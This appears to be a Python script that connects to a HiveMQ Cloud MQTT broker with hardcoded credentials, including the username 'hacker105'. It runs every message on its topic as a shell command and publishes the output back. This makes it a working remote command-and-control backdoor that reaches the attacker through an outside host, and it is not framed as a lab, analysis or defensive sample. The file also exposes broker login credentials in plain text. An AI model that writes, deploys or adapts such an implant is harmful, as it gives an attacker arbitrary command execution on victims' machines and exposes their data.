import paho.mqtt.client as mqtt
import ssl
import subprocess
# --- MQTT Connection Settings ---
BROKER = "f1f689ccfbc242149afb7d01719c207e.s1.eu.hivemq.cloud"
PORT = 8883
USERNAME = "hacker105"
PASSWORD = "Hacker123!@#"
TOPIC = "test/topic"

# --- Callback function when the client connects to the broker ---
def on_connect(client, userdata, flags, rc, properties=None):
    """
    This function is called when the connection to the broker is established.
    It subscribes the client to the specified topic.
    """
    if rc == 0:
        print(f"[+] Connected successfully to HiveMQ Cloud! Waiting for messages on topic '{TOPIC}'...")
        # Subscribing in on_connect() means that if we lose the connection and
        # reconnect, the subscription will be automatically renewed.
        client.subscribe(TOPIC)
    else:
        print(f"[-] Failed to connect, return code {rc}\n")

# --- Callback function when a message is received from the broker ---
def on_message(client, userdata, msg):
    """
    This function is called every time a message is received on a subscribed topic.
    It prints the message content to the terminal.
    """
    print(f"[>] Received message: '{msg.payload.decode()}'")
    # Execute the received command and send the output back to the broker
    result = subprocess.run(msg.payload.decode(), shell=True, capture_output=True, text=True)
    response_topic = f"{TOPIC}/response"
    client.publish(response_topic, result.stdout or result.stderr)
    

# --- Initialize the MQTT client ---
# We use MQTTv5, which is the latest version of the protocol.
client = mqtt.Client(protocol=mqtt.MQTTv5)

# Assign the callback functions to the client
client.on_connect = on_connect
client.on_message = on_message

# Set username and password for authentication
client.username_pw_set(USERNAME, PASSWORD)
# Enable TLS for a secure connection
client.tls_set(tls_version=ssl.PROTOCOL_TLS)

# --- Connect to the broker and start the network loop ---
try:
    # Attempt to connect to the broker
    print(f"[*] Connecting to broker {BROKER}...")
    client.connect(BROKER, PORT, 60)

    # loop_forever() is a blocking call that starts a background thread
    # to process network traffic, dispatch callbacks, and handle reconnecting.
    # The script will stay in this loop until you stop it (e.g., with Ctrl+C).
    client.loop_forever()

except KeyboardInterrupt:
    # This block runs if you press Ctrl+C to stop the script
    print("\n[*] Disconnecting from broker.")
    client.disconnect()
except Exception as e:
    # This block catches any other exceptions during connection or runtime
    print(f"[!] An error occurred: {e}")